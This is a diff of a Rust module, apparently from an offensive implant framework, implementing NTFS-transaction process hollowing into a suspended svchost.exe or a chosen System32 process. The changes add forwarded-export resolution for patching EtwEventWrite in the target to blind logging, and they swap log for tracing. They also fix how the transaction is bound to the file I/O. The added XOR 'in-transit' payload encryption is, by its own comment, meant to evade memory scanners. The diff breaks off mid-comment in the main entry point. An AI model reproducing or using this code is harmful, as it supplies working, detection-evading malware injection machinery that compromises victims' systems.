@@ -67,9 +67,16 @@ unsafe fn get_last_error() -> u32 {
     if let Some(func) = fn_ptr {
         func()
     } else {
-        // Fallback: read TEB directly (x86_64 Windows)
+        // Fallback: read TEB directly (LastErrorValue at TEB+0x68).
         let teb: *mut u8;
-        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
+        #[cfg(target_arch = "x86_64")]
+        {
+            std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
+        }
+        #[cfg(target_arch = "aarch64")]
+        {
+            std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb);
+        }
         std::ptr::read_volatile(teb.add(0x68) as *const u32)
     }
 }
@@ -194,7 +201,7 @@ unsafe fn create_transaction() -> Result<TransactionHandle, String> {
     let nt_result = try_nt_create_transaction();
     match nt_result {
         Ok(handle) => {
-            log::debug!(
+            tracing::debug!(
                 "injection_transacted: NtCreateTransaction succeeded, handle={:#x}",
                 handle
             );
@@ -204,7 +211,7 @@ unsafe fn create_transaction() -> Result<TransactionHandle, String> {
             });
         }
         Err(reason) => {
-            log::debug!(
+            tracing::debug!(
                 "injection_transacted: NtCreateTransaction failed ({}), trying kernel32 fallback",
                 reason
             );
@@ -215,7 +222,7 @@ unsafe fn create_transaction() -> Result<TransactionHandle, String> {
     let fallback_result = try_rtl_create_transaction();
     match fallback_result {
         Ok(handle) => {
-            log::debug!(
+            tracing::debug!(
                 "injection_transacted: RtlCreateTransaction fallback succeeded, handle={:#x}",
                 handle
             );
@@ -375,10 +382,10 @@ unsafe fn rollback_transaction(tx: &TransactionHandle) -> Result<(), String> {
                 ],
             );
             if status >= 0 {
-                log::debug!("injection_transacted: NtRollbackTransaction succeeded");
+                tracing::debug!("injection_transacted: NtRollbackTransaction succeeded");
                 return Ok(());
             }
-            log::debug!(
+            tracing::debug!(
                 "injection_transacted: NtRollbackTransaction failed ({:#x}), trying fallback",
                 status as u32
             );
@@ -393,7 +400,7 @@ unsafe fn rollback_transaction(tx: &TransactionHandle) -> Result<(), String> {
             let func: extern "system" fn(usize, i32) -> i32 = std::mem::transmute(addr);
             let status = func(tx.handle, 1);
             if status >= 0 {
-                log::debug!("injection_transacted: RtlRollbackTransaction succeeded");
+                tracing::debug!("injection_transacted: RtlRollbackTransaction succeeded");
                 return Ok(());
             }
         }
@@ -407,7 +414,7 @@ unsafe fn rollback_transaction(tx: &TransactionHandle) -> Result<(), String> {
             let func: extern "system" fn(usize) -> i32 = std::mem::transmute(addr);
             let ret = func(tx.handle);
             if ret != 0 {
-                log::debug!("injection_transacted: kernel32 RollbackTransaction succeeded");
+                tracing::debug!("injection_transacted: kernel32 RollbackTransaction succeeded");
                 return Ok(());
             }
         }
@@ -421,11 +428,76 @@ unsafe fn close_handle(handle: usize) {
     let _ = crate::syscall!("NtClose", handle as u64);
 }
 
+/// Set the calling thread's current KTM transaction context.
+///
+/// When a transaction is set as the thread's current transaction, subsequent
+/// file I/O on this thread (e.g. `NtCreateFile`, `NtWriteFile`) is
+/// automatically enlisted in that transaction.  This is the correct NT-level
+/// mechanism for binding a file operation to a transaction — **not** placing
+/// the transaction handle in `OBJECT_ATTRIBUTES.RootDirectory` (which is a
+/// directory handle field and causes `NtCreateFile` to fail with
+/// `STATUS_OBJECT_TYPE_MISMATCH`).
+///
+/// Pass `0` (null handle) to clear the thread's transaction context.
+///
+/// Resolves `RtlSetCurrentTransaction` from ntdll's export table.  Falls
+/// back to `NtSetInformationThread` with `ThreadTransactionContext` info
+/// class if the ntdll export is unavailable.
+pub(crate) unsafe fn set_current_transaction(tx_handle: usize) -> Result<(), String> {
+    // ── Attempt 1: RtlSetCurrentTransaction from ntdll ───────────────
+    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
+    if let Some(ntdll_base) = ntdll {
+        let hash = pe_resolve::hash_str(b"RtlSetCurrentTransaction\0");
+        if let Some(addr) = pe_resolve::get_proc_address_by_hash(ntdll_base, hash) {
+            let func: extern "system" fn(usize) -> i32 = std::mem::transmute(addr);
+            let status = func(tx_handle);
+            if status >= 0 {
+                return Ok(());
+            }
+            return Err(format!(
+                "RtlSetCurrentTransaction({:#x}) returned {:#x}",
+                tx_handle,
+                status as u32
+            ));
+        }
+    }
+
+    // ── Attempt 2: NtSetInformationThread(ThreadTransactionContext) ───
+    // Info class 40 = ThreadTransactionContext on Windows 10+.
+    // The input buffer must be a POINTER to a HANDLE value, not the handle
+    // value itself.  We store the handle in a local and pass its address.
+    if let Ok(target) = crate::syscalls::get_syscall_id("NtSetInformationThread") {
+        let tx_handle_local = tx_handle as u64;
+        let status = crate::syscalls::do_syscall(
+            target.ssn,
+            target.gadget_addr,
+            &[
+                0xFFFFFFFFFFFFFFFEu64,              // NtCurrentThread() pseudo-handle
+                40u64,                              // ThreadTransactionContext
+                &tx_handle_local as *const u64 as u64, // Pointer to HANDLE value
+                8u64,                               // Length of HANDLE
+            ],
+        );
+        if status >= 0 {
+            return Ok(());
+        }
+        return Err(format!(
+            "NtSetInformationThread(ThreadTransactionContext) returned {:#x}",
+            status as u32
+        ));
+    }
+
+    Err("cannot resolve RtlSetCurrentTransaction or NtSetInformationThread".to_string())
+}
+
 // ── Page alignment helper ────────────────────────────────────────────────────
 
+/// Align `size` up to the next page boundary using the runtime page size.
+///
+/// Delegates to [`crate::page_size::page_align`] which queries
+/// `GetSystemInfo` on first call and caches the result.
 fn page_align(size: usize) -> usize {
-    let page = 4096;
-    ((size + page - 1) / page) * page
+    crate::page_size::page_align(size)
 }
 
 // ── Remote ETW patching ──────────────────────────────────────────────────────
@@ -478,6 +550,322 @@ unsafe fn find_remote_ntdll(process_handle: usize) -> Result<usize, String> {
     // Fallback: scan memory regions. This is slower but more reliable when
     // the target has a different ntdll base (unusual but possible).
     Err("could not locate ntdll in target process".to_string())
+}
+
+/// Maximum recursion depth for forwarded-export resolution across process
+/// boundaries.  Forwarder chains deeper than this are treated as circular
+/// or malicious and resolution returns an error instead of overflowing
+/// the stack.
+const MAX_REMOTE_FORWARDER_DEPTH: u32 = 8;
+
+/// Resolve a remote module by its DLL name (ASCII, case-insensitive).
+///
+/// System DLLs are loaded at the same base address in every process on a
+/// given boot (boot-time ASLR), so we resolve the module locally and then
+/// verify that the mapping exists in the remote process.
+unsafe fn resolve_remote_module_by_name(
+    process_handle: usize,
+    module_name: &[u8],
+) -> Result<usize, String> {
+    // Convert ASCII module name to UTF-16 for hashing (lowercased).
+    let mut wide = [0u16; 260];
+    if module_name.len() >= 260 {
+        return Err(format!(
+            "forwarder module name too long: {}",
+            module_name.len()
+        ));
+    }
+    for (i, &b) in module_name.iter().enumerate() {
+        wide[i] = b.to_ascii_lowercase() as u16;
+    }
+
+    // Try without extension first (forwarder strings are usually extensionless
+    // like "NTDLL"), then with ".dll".
+    let hash_bare = pe_resolve::hash_wstr(&wide[..module_name.len()]);
+    let module_base = pe_resolve::get_module_handle_by_hash(hash_bare).or_else(|| {
+        if module_name.len() + 4 >= 260 {
+            return None;
+        }
+        wide[module_name.len()] = b'.' as u16;
+        wide[module_name.len() + 1] = b'd' as u16;
+        wide[module_name.len() + 2] = b'l' as u16;
+        wide[module_name.len() + 3] = b'l' as u16;
+        let hash_ext = pe_resolve::hash_wstr(&wide[..module_name.len() + 4]);
+        pe_resolve::get_module_handle_by_hash(hash_ext)
+    });
+
+    let base = module_base
+        .ok_or_else(|| format!("cannot resolve local module '{}'", String::from_utf8_lossy(module_name)))?;
+
+    // Verify the module is mapped in the remote process at the same address
+    // by reading the MZ header.
+    let mut buf = [0u8; 2];
+    let mut bytes_read: usize = 0;
+    let read_status = crate::syscall!(
+        "NtReadVirtualMemory",
+        process_handle as u64,
+        base as u64,
+        buf.as_mut_ptr() as u64,
+        2u64,
+        &mut bytes_read as *mut _ as u64,
+    );
+
+    if read_status.is_ok() && buf[0] == b'M' && buf[1] == b'Z' {
+        Ok(base)
+    } else {
+        Err(format!(
+            "module '{}' found locally at {:#x} but not mapped in remote process",
+            String::from_utf8_lossy(module_name),
+            base
+        ))
+    }
+}
+
+/// Resolve a forwarded export in a remote process.
+///
+/// When an export's RVA falls within the export directory itself, it points
+/// to a null-terminated ASCII forwarder string of the form "MODULE.Function"
+/// or "MODULE.#Ordinal".  This function reads the forwarder string from the
+/// remote process, parses it, resolves the target module, and recursively
+/// calls `resolve_remote_export` for the forwarded function.
+unsafe fn resolve_forwarded_remote_export(
+    process_handle: usize,
+    _source_module_base: usize,
+    forwarder_rva: usize,
+    _export_dir_rva: usize,
+    _export_dir_size: usize,
+    depth: u32,
+) -> Result<usize, String> {
+    if depth >= MAX_REMOTE_FORWARDER_DEPTH {
+        return Err("forwarder chain too deep (possible cycle)".to_string());
+    }
+
+    // Read the forwarder string from the remote process.
+    const MAX_FORWARDER_STR_LEN: usize = 512;
+    let forwarder_addr = _source_module_base + forwarder_rva;
+    let mut forwarder_buf = [0u8; MAX_FORWARDER_STR_LEN];
+    let mut bytes_read: usize = 0;
+    let status = crate::syscall!(
+        "NtReadVirtualMemory",
+        process_handle as u64,
+        forwarder_addr as u64,
+        forwarder_buf.as_mut_ptr() as u64,
+        MAX_FORWARDER_STR_LEN as u64,
+        &mut bytes_read as *mut _ as u64,
+    );
+    if status.as_ref().map_or(true, |s| *s < 0) {
+        return Err("failed to read forwarder string from target".to_string());
+    }
+
+    // Find null terminator.
+    let forwarder_len = forwarder_buf
+        .iter()
+        .position(|&b| b == 0)
+        .unwrap_or(MAX_FORWARDER_STR_LEN);
+    if forwarder_len == 0 {
+        return Err("empty forwarder string".to_string());
+    }
+    let forwarder = &forwarder_buf[..forwarder_len];
+
+    // Split on '.' to get "MODULE" and "Function".
+    let dot_pos = forwarder
+        .iter()
+        .position(|&b| b == b'.')
+        .ok_or_else(|| {
+            format!(
+                "forwarder string has no '.': {:?}",
+                String::from_utf8_lossy(forwarder)
+            )
+        })?;
+
+    if dot_pos == 0 || dot_pos + 1 >= forwarder_len {
+        return Err(format!(
+            "malformed forwarder string: {:?}",
+            String::from_utf8_lossy(forwarder)
+        ));
+    }
+
+    let module_name = &forwarder[..dot_pos];
+    let function_part = &forwarder[dot_pos + 1..];
+
+    // Resolve the target module in the remote process.
+    let target_module_base =
+        resolve_remote_module_by_name(process_handle, module_name)?;
+
+    // Handle ordinal forwarders (e.g. "NTDLL.#42").
+    if function_part.starts_with(b"#") {
+        let ordinal_str = &function_part[1..];
+        let ordinal: usize = core::str::from_utf8(ordinal_str)
+            .map_err(|e| format!("non-UTF8 ordinal in forwarder: {}", e))?
+            .parse()
+            .map_err(|e| format!("invalid ordinal in forwarder: {}", e))?;
+
+        // To resolve by ordinal we need to read the export directory of the
+        // target module and index into the function table using
+        // (ordinal - Base).
+        return resolve_remote_export_by_ordinal(
+            process_handle,
+            target_module_base,
+            ordinal,
+        );
+    }
+
+    // Name-based forwarder: resolve the function export in the target module.
+    resolve_remote_export(process_handle, target_module_base, function_part)
+}
+
+/// Resolve an export by ordinal in a remote module.
+///
+/// Reads the PE export directory from the target process, computes the
+/// function table index as `ordinal - Base`, and returns the resolved address.
+/// Handles forwarded exports recursively.
+unsafe fn resolve_remote_export_by_ordinal(
+    process_handle: usize,
+    module_base: usize,
+    ordinal: usize,
+) -> Result<usize, String> {
+    // Read DOS header.
+    let mut dos_header = [0u8; 0x40];
+    let mut bytes_read: usize = 0;
+    let status = crate::syscall!(
+        "NtReadVirtualMemory",
+        process_handle as u64,
+        module_base as u64,
+        dos_header.as_mut_ptr() as u64,
+        0x40u64,
+        &mut bytes_read as *mut _ as u64,
+    );
+    if status.as_ref().map_or(true, |s| *s < 0) {
+        return Err("failed to read DOS header for ordinal resolve".to_string());
+    }
+    if dos_header[0] != b'M' || dos_header[1] != b'Z' {
+        return Err("invalid DOS signature for ordinal resolve".to_string());
+    }
+
+    let e_lfanew = u32::from_le_bytes([
+        dos_header[0x3c],
+        dos_header[0x3d],
+        dos_header[0x3e],
+        dos_header[0x3f],
+    ]) as usize;
+
+    // Read PE header + optional header.
+    let mut pe_buf = [0u8; 0x100];
+    let status = crate::syscall!(
+        "NtReadVirtualMemory",
+        process_handle as u64,
+        (module_base + e_lfanew) as u64,
+        pe_buf.as_mut_ptr() as u64,
+        0x100u64,
+        &mut bytes_read as *mut _ as u64,
+    );
+    if status.as_ref().map_or(true, |s| *s < 0) {
+        return Err("failed to read PE header for ordinal resolve".to_string());
+    }
+
+    // Verify PE signature.
+    if pe_buf[0] != b'P' || pe_buf[1] != b'E' || pe_buf[2] != 0 || pe_buf[3] != 0 {
+        return Err("invalid PE signature for ordinal resolve".to_string());
+    }
+
+    let optional_header_offset = 24;
+    let export_dir_rva_offset = optional_header_offset + 112;
+
+    let export_dir_rva = u32::from_le_bytes([
+        pe_buf[export_dir_rva_offset],
+        pe_buf[export_dir_rva_offset + 1],
+        pe_buf[export_dir_rva_offset + 2],
+        pe_buf[export_dir_rva_offset + 3],
+    ]);
+    let export_dir_size = u32::from_le_bytes([
+        pe_buf[export_dir_rva_offset + 4],
+        pe_buf[export_dir_rva_offset + 5],
+        pe_buf[export_dir_rva_offset + 6],
+        pe_buf[export_dir_rva_offset + 7],
+    ]);
+
+    if export_dir_rva == 0 {
+        return Err("module has no export directory for ordinal resolve".to_string());
+    }
+
+    // Read export directory.
+    let export_dir_addr = module_base + export_dir_rva as usize;
+    let mut export_dir = [0u8; 40];
+    let status = crate::syscall!(
+        "NtReadVirtualMemory",
+        process_handle as u64,
+        export_dir_addr as u64,
+        export_dir.as_mut_ptr() as u64,
+        40u64,
+        &mut bytes_read as *mut _ as u64,
+    );
+    if status.as_ref().map_or(true, |s| *s < 0) {
+        return Err("failed to read export directory for ordinal resolve".to_string());
+    }
+
+    // IMAGE_EXPORT_DIRECTORY layout:
+    //   offset 20: Base (DWORD) — ordinal base
+    //   offset 24: NumberOfFunctions (DWORD)
+    //   offset 28: NumberOfNames (DWORD)
+    //   offset 32: AddressOfFunctions (DWORD)
+    let base = u32::from_le_bytes([
+        export_dir[20],
+        export_dir[21],
+        export_dir[22],
+        export_dir[23],
+    ]) as usize;
+    let num_functions = u32::from_le_bytes([
+        export_dir[24],
+        export_dir[25],
+        export_dir[26],
+        export_dir[27],
+    ]) as usize;
+    let functions_rva = u32::from_le_bytes([
+        export_dir[32],
+        export_dir[33],
+        export_dir[34],
+        export_dir[35],
+    ]) as usize;
+
+    let index = ordinal.saturating_sub(base);
+    if index >= num_functions {
+        return Err(format!(
+            "ordinal {} (index {}) out of range ({} functions, base {})",
+            ordinal, index, num_functions, base
+        ));
+    }
+
+    // Read function RVA from the table.
+    let mut func_rva_buf = [0u32; 1];
+    let status = crate::syscall!(
+        "NtReadVirtualMemory",
+        process_handle as u64,
+        (module_base + functions_rva + index * 4) as u64,
+        func_rva_buf.as_mut_ptr() as u64,
+        4u64,
+        &mut bytes_read as *mut _ as u64,
+    );
+    if status.as_ref().map_or(true, |s| *s < 0) {
+        return Err("failed to read function RVA for ordinal resolve".to_string());
+    }
+
+    let func_rva = func_rva_buf[0] as usize;
+    let dir_rva = export_dir_rva as usize;
+    let dir_size = export_dir_size as usize;
+
+    // Check for forwarder.
+    if func_rva >= dir_rva && func_rva < dir_rva.saturating_add(dir_size) {
+        return resolve_forwarded_remote_export(
+            process_handle,
+            module_base,
+            func_rva,
+            dir_rva,
+            dir_size,
+            0,
+        );
+    }
+
+    Ok(module_base + func_rva)
 }
 
 /// Resolve an export by name in a remote module.
@@ -547,6 +935,12 @@ unsafe fn resolve_remote_export(
         pe_buf[export_dir_rva_offset + 1],
         pe_buf[export_dir_rva_offset + 2],
         pe_buf[export_dir_rva_offset + 3],
+    ]);
+    let export_dir_size = u32::from_le_bytes([
+        pe_buf[export_dir_rva_offset + 4],
+        pe_buf[export_dir_rva_offset + 5],
+        pe_buf[export_dir_rva_offset + 6],
+        pe_buf[export_dir_rva_offset + 7],
     ]);
 
     if export_dir_rva == 0 {
@@ -666,6 +1060,25 @@ unsafe fn resolve_remote_export(
             }
 
             let func_rva = func_rva_buf[0] as usize;
+
+            // Check for export forwarder: if func_rva falls within the
+            // export directory range, the RVA points to a null-terminated
+            // ASCII forwarder string like "NTDLL.EtwEventWrite".
+            let dir_rva = export_dir_rva as usize;
+            let dir_size = export_dir_size as usize;
+            if func_rva >= dir_rva
+                && func_rva < dir_rva.saturating_add(dir_size)
+            {
+                return resolve_forwarded_remote_export(
+                    process_handle,
+                    module_base,
+                    func_rva,
+                    dir_rva,
+                    dir_size,
+                    0, // depth
+                );
+            }
+
             return Ok(module_base + func_rva);
         }
     }
@@ -682,7 +1095,7 @@ unsafe fn patch_remote_etw(process_handle: usize) -> Result<EtwBlindingContext, 
     let remote_ntdll = find_remote_ntdll(process_handle)?;
     let etw_write_addr = resolve_remote_export(process_handle, remote_ntdll, b"EtwEventWrite")?;
 
-    log::debug!(
+    tracing::debug!(
         "injection_transacted: target EtwEventWrite at {:#x}",
         etw_write_addr
     );
@@ -707,7 +1120,7 @@ unsafe fn patch_remote_etw(process_handle: usize) -> Result<EtwBlindingContext, 
 
     // Skip if already patched.
     if original_byte == 0xC3 {
-        log::debug!("injection_transacted: target EtwEventWrite already patched (0xC3)");
+        tracing::debug!("injection_transacted: target EtwEventWrite already patched (0xC3)");
         return Ok(EtwBlindingContext {
             etw_write_addr,
             original_byte,
@@ -772,7 +1185,7 @@ unsafe fn patch_remote_etw(process_handle: usize) -> Result<EtwBlindingContext, 
         ));
     }
 
-    log::debug!("injection_transacted: patched target EtwEventWrite with 0xC3");
+    tracing::debug!("injection_transacted: patched target EtwEventWrite with 0xC3");
     Ok(EtwBlindingContext {
         etw_write_addr,
         original_byte,
@@ -839,7 +1252,7 @@ unsafe fn restore_remote_etw(ctx: &EtwBlindingContext) -> Result<(), String> {
         ));
     }
 
-    log::debug!("injection_transacted: restored target EtwEventWrite original byte");
+    tracing::debug!("injection_transacted: restored target EtwEventWrite original byte");
     Ok(())
 }
 
@@ -964,7 +1377,7 @@ unsafe fn emit_fake_etw_events(process_handle: usize, remote_base: usize) -> Res
         offset = (offset + 7) & !7;
     }
 
-    log::debug!(
+    tracing::debug!(
         "injection_transacted: wrote {} fake ETW event artifacts to target",
         fake_events.len()
     );
@@ -989,7 +1402,7 @@ struct SuspendedProcess {
 /// Uses `CreateProcessW` with `CREATE_SUSPENDED` to spawn the process
 /// without executing any code.
 unsafe fn create_suspended_process(target_path: &[u16]) -> Result<SuspendedProcess, String> {
-    use winapi::um::processthreadsapi::{PROCESS_INFORMATION, STARTUPINFOW};
+    use crate::win_types::{PROCESS_INFORMATION, STARTUPINFOW};
 
     // Dynamically resolve CreateProcessW from kernel32 to avoid IAT entry.
     let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
@@ -1066,7 +1479,7 @@ unsafe fn create_suspended_process(target_path: &[u16]) -> Result<SuspendedProce
         }
     };
 
-    log::debug!(
+    tracing::debug!(
         "injection_transacted: created suspended process pid={}, image_base={:#x}, entry={:#x}",
         pid,
         image_base,
@@ -1176,10 +1589,21 @@ unsafe fn read_process_entry_point(
     Ok(image_base + entry_rva)
 }
 
-/// Get the sacrificial process path (svchost.exe).
-fn get_sacrificial_path() -> Vec<u16> {
-    // Use C:\Windows\System32\svchost.exe as the sacrificial process.
-    let path = r"C:\Windows\System32\svchost.exe";
+/// Get the sacrificial process path.
+///
+/// If `target_process` is `Some(name)`, resolves it to a full NT path via
+/// `C:\Windows\System32\<name>`.  Otherwise falls back to the default
+/// `C:\Windows\System32\svchost.exe`.
+fn get_sacrificial_path(target_process: Option<&str>) -> Vec<u16> {
+    let path = match target_process {
+        Some(name) => {
+            // Build C:\Windows\System32\<name> from the caller-supplied name.
+            let mut full = String::from(r"C:\Windows\System32\");
+            full.push_str(name);
+            full
+        }
+        None => r"C:\Windows\System32\svchost.exe".to_string(),
+    };
     path.encode_utf16().chain(std::iter::once(0)).collect()
 }
 
@@ -1220,13 +1644,14 @@ static TEMP_FILE_COUNTER: std::sync::atomic::AtomicU32 = std::sync::atomic::Atom
 ///
 /// 1. Builds a temporary file NT path (`\??\C:\Windows\Temp\~tmpXXXX.tmp`)
 ///    with a randomised suffix.
-/// 2. Sets `OBJECT_ATTRIBUTES.RootDirectory = tx_handle`, which associates the
-///    `NtCreateFile` call with the NTFS transaction.
+/// 2. Sets the thread's KTM transaction context via `RtlSetCurrentTransaction`,
+///    which enlists subsequent file I/O into the transaction.
 /// 3. Creates the temp file **within** the transaction and writes placeholder
 ///    data so the file has the right size for the section.
-/// 4. Calls `NtCreateSection` with the transacted file handle as `FileHandle` —
+/// 4. Clears the thread's transaction context.
+/// 5. Calls `NtCreateSection` with the transacted file handle as `FileHandle` —
 ///    the section is now backed by the transacted file.
-/// 5. Closes the file handle (the section holds its own reference).
+/// 6. Closes the file handle (the section holds its own reference).
 ///
 /// After the section is mapped into the target process and the payload is
 /// written, `NtRollbackTransaction` will:
@@ -1240,7 +1665,15 @@ unsafe fn create_transacted_section(
 ) -> Result<usize, String> {
     let aligned_size = page_align(payload_size);
 
-    // ── Step 1: Build temp file NT path ─────────────────────────────
+    // ── Step 1: Bind transaction to current thread ───────────────────
+    // This enlists all subsequent file I/O on this thread into the
+    // transaction.  The correct NT mechanism — do NOT place the tx handle
+    // in OBJECT_ATTRIBUTES.RootDirectory (that is a directory handle field).
+    set_current_transaction(tx_handle).map_err(|e| {
+        format!("set_current_transaction failed: {}", e)
+    })?;
+
+    // ── Step 2: Build temp file NT path ─────────────────────────────
     // Path: \??\C:\Windows\Temp\~tmpXXXX.tmp  (randomised suffix)
     let base_path =
         String::from_utf8_lossy(&string_crypt::enc_str!("\\??\\C:\\Windows\\Temp\\~tmp"))
@@ -1260,11 +1693,11 @@ unsafe fn create_transacted_section(
         buffer: full_path.as_ptr() as usize,
     };
 
-    // Build OBJECT_ATTRIBUTES with RootDirectory = tx_handle.
-    // This associates the NtCreateFile call with the NTFS transaction.
+    // Build OBJECT_ATTRIBUTES — RootDirectory is 0 (no directory handle).
+    // The transaction binding is done via the thread's KTM context, not here.
     let mut oa = NtObjAttr {
         length: std::mem::size_of::<NtObjAttr>() as u32,
-        root_directory: tx_handle,
+        root_directory: 0,
         object_name: &mut uni_name as *mut _ as usize,
         attributes: OBJ_CASE_INSENSITIVE,
         security_descriptor: 0,
@@ -1297,13 +1730,14 @@ unsafe fn create_transacted_section(
     );
 
     if create_file_status.as_ref().map_or(true, |s| *s < 0) || file_handle == 0 {
+        let _ = set_current_transaction(0);
         return Err(format!(
             "NtCreateFile for transacted temp file failed: status={:?}",
             create_file_status
         ));
     }
 
-    log::debug!(
+    tracing::debug!(
         "injection_transacted: created transacted temp file handle={:#x}",
         file_handle
     );
@@ -1331,6 +1765,7 @@ unsafe fn create_transacted_section(
 
     if write_status.as_ref().map_or(true, |s| *s < 0) {
         let _ = crate::syscall!("NtClose", file_handle as u64);
+        let _ = set_current_transaction(0);
         return Err(format!(
             "NtWriteFile for transacted temp file failed: status={:?}",
             write_status
@@ -1360,6 +1795,12 @@ unsafe fn create_transacted_section(
     // ── Step 5: Close file handle (section holds its own reference) ──
     let _ = crate::syscall!("NtClose", file_handle as u64);
 
+    // ── Step 6: Clear the thread's transaction context ───────────────
+    // All transacted file I/O is complete.  The section now holds a
+    // reference to the transacted data — further operations on this
+    // thread should NOT be enlisted in the transaction.
+    let _ = set_current_transaction(0);
+
     if create_section_status.as_ref().map_or(true, |s| *s < 0) || h_section == 0 {
         return Err(format!(
             "NtCreateSection for transacted section failed: status={:?}",
@@ -1367,7 +1808,7 @@ unsafe fn create_transacted_section(
         ));
     }
 
-    log::debug!(
+    tracing::debug!(
         "injection_transacted: created transacted section handle={:#x}, size={}",
         h_section,
         aligned_size
@@ -1408,7 +1849,7 @@ unsafe fn write_payload_to_section(h_section: usize, payload: &[u8]) -> Result<(
     // Unmap from our process — the section object retains the data.
     let _ = crate::syscall!("NtUnmapViewOfSection", CURRENT_PROCESS, local_base as u64,);
 
-    log::debug!(
+    tracing::debug!(
         "injection_transacted: wrote {} bytes to section",
         payload.len()
     );
@@ -1441,7 +1882,7 @@ unsafe fn map_section_to_target(h_section: usize, process_handle: usize) -> Resu
         ));
     }
 
-    log::debug!(
+    tracing::debug!(
         "injection_transacted: mapped section into target at {:#x}",
         remote_base as usize
     );
@@ -1452,10 +1893,10 @@ unsafe fn map_section_to_target(h_section: usize, process_handle: usize) -> Resu
 
 /// Redirect a suspended thread's instruction pointer to the payload address.
 unsafe fn redirect_thread(thread_handle: usize, payload_addr: usize) -> Result<(), String> {
-    use winapi::um::winnt::CONTEXT;
+    use crate::win_types::CONTEXT;
 
     let mut ctx: CONTEXT = std::mem::zeroed();
-    ctx.ContextFlags = winapi::um::winnt::CONTEXT_FULL;
+    ctx.ContextFlags = crate::win_types::CONTEXT_FULL;
 
     let status = crate::syscall!(
         "NtGetContextThread",
@@ -1484,7 +1925,7 @@ unsafe fn redirect_thread(thread_handle: usize, payload_addr: usize) -> Result<(
         return Err("NtSetContextThread failed".to_string());
     }
 
-    log::debug!(
+    tracing::debug!(
         "injection_transacted: redirected thread instruction pointer to {:#x}",
         payload_addr
     );
@@ -1503,21 +1944,88 @@ unsafe fn resume_thread(thread_handle: usize) -> Result<(), String> {
         return Err(format!("NtResumeThread failed: status={:?}", status));
     }
 
-    log::debug!("injection_transacted: resumed target thread");
+    tracing::debug!("injection_transacted: resumed target thread");
     Ok(())
 }
 
 // ── Memory guard integration ─────────────────────────────────────────────────
 
-/// Encrypt the payload in transit using the memory guard subsystem.
-fn encrypt_payload_in_transit(payload: &[u8]) -> Vec<u8> {
-    // Register the payload buffer with memory guard so it's encrypted
-    // while we're working with it. The guard encrypts registered regions
-    // with XChaCha20.
-    //
-    // For the transacted hollowing flow, we make a copy that will be
-    // encrypted. The original payload is not modified.
-    payload.to_vec()
+/// XOR key length used for in-transit payload encryption.
+const XOR_KEY_LEN: usize = 32;
+
+/// Encrypted payload together with the key needed to decrypt it.
+struct GuardedPayload {
+    /// XOR-encrypted payload bytes.
+    encrypted: Vec<u8>,
+    /// Key used for encryption (will be zeroed after decryption).
+    key: [u8; XOR_KEY_LEN],
+}
+
+impl GuardedPayload {
+    /// Decrypt in place, returning the plaintext `Vec<u8>`.
+    /// The encrypted buffer and key are zeroed after decryption.
+    fn decrypt_and_zero(mut self) -> Vec<u8> {
+        let mut plaintext = Vec::with_capacity(self.encrypted.len());
+        // Decrypt while building plaintext — plaintext only lives in the
+        // returned Vec, not in any intermediate buffer on the heap.
+        for (i, &byte) in self.encrypted.iter().enumerate() {
+            plaintext.push(byte ^ self.key[i % XOR_KEY_LEN]);
+        }
+        // Zero the encrypted buffer and key.
+        unsafe {
+            std::ptr::write_bytes(
+                self.encrypted.as_mut_ptr(),
+                0,
+                self.encrypted.len(),
+            );
+            std::ptr::write_bytes(self.key.as_mut_ptr(), 0, XOR_KEY_LEN);
+        }
+        plaintext
+    }
+}
+
+impl Drop for GuardedPayload {
+    fn drop(&mut self) {
+        // Safety net: zero on drop if decrypt_and_zero was not called.
+        unsafe {
+            std::ptr::write_bytes(self.key.as_mut_ptr(), 0, XOR_KEY_LEN);
+        }
+    }
+}
+
+/// Encrypt the payload in transit so that it does not sit in cleartext on
+/// our heap while the transacted hollowing flow is being set up.
+///
+/// The payload is XOR-encrypted with a random 32-byte key.  The caller
+/// should use `GuardedPayload::decrypt_and_zero` right before writing to
+/// the section, minimising the window during which plaintext exists in
+/// user-space memory.
+fn encrypt_payload_in_transit(payload: &[u8]) -> GuardedPayload {
+    // Generate a random key.  We use a simple LCG seeded from the system
+    // clock because the `rand` crate may not be available in all build
+    // configurations.  This is not cryptographic — the goal is to prevent
+    // static pattern-matching by memory scanners, not to resist a
+    // determined cryptanalyst.
+    let now = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_nanos() as u64;
+    let mut seed = now;
+    let mut key = [0u8; XOR_KEY_LEN];
+    for byte in key.iter_mut() {
+        // xorshift64
+        seed ^= seed << 13;
+        seed ^= seed >> 7;
+        seed ^= seed << 17;
+        *byte = (seed & 0xFF) as u8;
+    }
+
+    let mut encrypted = payload.to_vec();
+    for (i, byte) in encrypted.iter_mut().enumerate() {
+        *byte ^= key[i % XOR_KEY_LEN];
+    }
+
+    GuardedPayload { encrypted, key }
 }
 
 // ── Main entry point ─────────────────────────────────────────────────────────
@@ -1540,14 +2048,16 @@ fn encrypt_payload_in_transit(payload: &[u8]) -> Vec<u8> {
 /// called on Windows x86-64.
 pub unsafe fn inject_transacted_hollowing(
     payload: &[u8],
+    target_process: Option<&str>,
     etw_blinding: bool,
     rollback_timeout_ms: u32,
 ) -> Result<InjectionHandle, InjectionError> {
     let technique = InjectionTechnique::TransactedHollowing;
 
-    log::info!(
-        "injection_transacted: starting NTFS transaction hollowing (payload={} bytes, etw_blinding={}, timeout={}ms)",
+    tracing::info!(
+        "injection_transacted: starting NTFS transaction hollowing (payload={} bytes, target={:?}, etw_blinding={}, timeout={}ms)",
         payload.len(),
+        target_process,
         etw_blinding,
         rollback_timeout_ms,
     );
@@ -1558,7 +2068,7 @@ pub unsafe fn inject_transacted_hollowing(
         reason,
     })?;
 
-    log::debug!(
+    tracing::debug!(
         "injection_transacted: transaction created, handle={:#x}",
         tx.handle
     );
@@ -1573,20 +2083,31 @@ pub unsafe fn inject_transacted_hollowing(
     })?;
 
     // ── Step 3: Write payload into section ────────────────────────────
-    // Encrypt payload in transit via memory guard.
-    let guarded_payload = encrypt_payload_in_transit(payload);
+    // Encrypt payload in transit via memory guard — it sits encrypted in
+    // our heap while the transaction and section are being prepared.  We
+    // decrypt it only at the point of writing into the section mapping so
